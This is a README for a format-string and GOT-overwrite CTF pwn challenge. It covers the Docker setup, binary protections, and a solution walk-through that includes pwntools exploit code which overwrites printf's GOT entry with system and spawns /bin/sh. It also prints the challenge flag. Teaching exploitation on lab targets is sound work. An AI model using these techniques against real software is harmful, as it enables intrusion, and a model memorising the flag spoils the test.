# Ethack_Tk1

## fmt-got — Format String + GOT-Overwrite CTF Challenge

A self-contained pwn challenge that teaches the classic **format-string
vulnerability** combined with a **GOT (Global Offset Table) overwrite**
under **Partial RELRO**.

---

### Challenge Summary

| Property | Value |
|---|---|
| Category | pwn |
| Technique | Format-string write → GOT overwrite |
| Binary protections | Partial RELRO · No PIE · No stack canary · NX |
| Port | 3012 |

The binary leaks `system()` at startup so participants can focus on the
format-string write primitive.  The goal is to overwrite the `printf` GOT
entry with `system`, then send `"/bin/sh"` to spawn a shell.  Inside that
shell, run `./flag` (an SUID binary) to print the flag.

---

### Directory Layout

```
challenge/
├── Dockerfile   – builds and serves the challenge on port 3012
├── chall.c      – vulnerable binary source
├── flag.c       – SUID flag-printer source
└── solve.py     – pwntools exploit (reference solver)
```

---

### Building & Running (Docker)

```bash
cd challenge

# Build the image
docker build -t fmt-got .

# Run locally on port 3012
docker run -p 3012:3012 --rm fmt-got
```

> **Tip:** If you want to play the challenge locally without Docker, compile
> `chall.c` with the same flags used in the Dockerfile:
>
> ```bash
> gcc -o chall chall.c -no-pie -Wl,-z,relro -fno-stack-protector
> ```

---

### Extracting the Binary (for local analysis)

Participants typically receive the compiled binary so they can perform offline
analysis (checksec, objdump, patchelf, …).  Copy it out of a running container:

```bash
# start a temporary container
CID=$(docker run -d fmt-got)

# copy the binary
docker cp "$CID":/challenge/chall ./chall

# stop the container
docker stop "$CID"
```

If the remote server runs a different libc than your local machine you can
patch the binary with **patchelf**:

```bash
# extract the container's libc and linker
docker cp "$CID":/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
docker cp "$CID":/lib64/ld-linux-x86-64.so.2    ./ld-linux-x86-64.so.2

patchelf --set-interpreter ./ld-linux-x86-64.so.2 \
         --replace-needed  libc.so.6 ./libc.so.6 \
         chall
mv chall chall_patched
```

Then point `solve.py` at `./chall_patched`.

---

### Binary Protections (checksec)

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO    ← GOT is writable ✓
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE           ← fixed base address ✓
```

---

### Solution Walk-through

#### 1. Receive the system() leak

The binary prints the runtime address of `system()`:

```
Gift for you: 0x7f1234567890
```

#### 2. Overwrite printf GOT → system

The `printf(buf)` call is a classic format-string sink.  Using pwntools'
`fmtstr_payload` at offset **6** we write the leaked `system()` address into
`printf`'s GOT entry.

```python
from pwn import *

exe = ELF("./chall")
printf_got  = exe.got["printf"]   # fixed (no PIE)
system_addr = <leaked value>

payload = fmtstr_payload(6, {printf_got: system_addr}, write_size="short")
r.sendline(payload)
```

> **Finding the offset** – If you need to verify or adjust the offset, use
> `fmtstr_find_offset` or the `find_offset()` helper in `solve.py`.

#### 3. Spawn a shell

After the GOT overwrite, every subsequent call to `printf(buf)` is really
`system(buf)`.  Send `"/bin/sh\0"` to open an interactive shell:

```python
r.sendline(b"/bin/sh")
r.interactive()
```

#### 4. Read the flag

Inside the shell:

```bash
$ ./flag
Now where were we?
CTF{f0rm4t_str1ng_g0t_wr1t3_4nd_sh3ll_3sc4p3}
```

The `flag` binary is **SUID root** and reads `/flag.txt` (which is mode
`0400`, readable only by root), so regular users on the remote machine cannot
cat the flag directly—they must go through the exploit.

---

### Running the Solver

```bash
pip install pwntools

# against the Docker container running on localhost:3012
python3 challenge/solve.py

# local process (no network)
python3 challenge/solve.py LOCAL

# local process with GDB attached
python3 challenge/solve.py LOCAL DEBUG
```

---

### Flag

```
CTF{f0rm4t_str1ng_g0t_wr1t3_4nd_sh3ll_3sc4p3}
```

*(Change this in the Dockerfile before deploying to a real event.)*
